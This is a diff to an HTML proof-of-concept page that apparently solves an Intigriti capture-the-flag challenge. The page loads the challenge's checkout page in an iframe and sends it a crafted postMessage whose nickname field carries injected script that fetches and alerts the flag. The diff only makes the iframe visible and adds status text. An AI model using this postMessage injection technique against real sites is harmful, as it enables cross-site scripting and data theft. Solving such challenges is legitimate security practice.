@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000" style="display:none"></iframe>
+<p>Exploit running...</p>
+<iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000" style="width:600px;height:400px;border:1px solid #ccc"></iframe>
 <script>
 window.onload = () => {
     setTimeout(() => {
@@ -11,6 +12,7 @@ window.onload = () => {
             .then(d=>alert('FLAG: '+d.flag))
         ">`;
         document.getElementById('f').contentWindow.postMessage({type:'submitTransaction',transaction:{toAddress:'deadbeef',currency:'BTC',amount:0.0001,nickname:p}},'*');
+        document.querySelector('p').textContent = 'postMessage sent!';
     },2500);
 };
 </script>
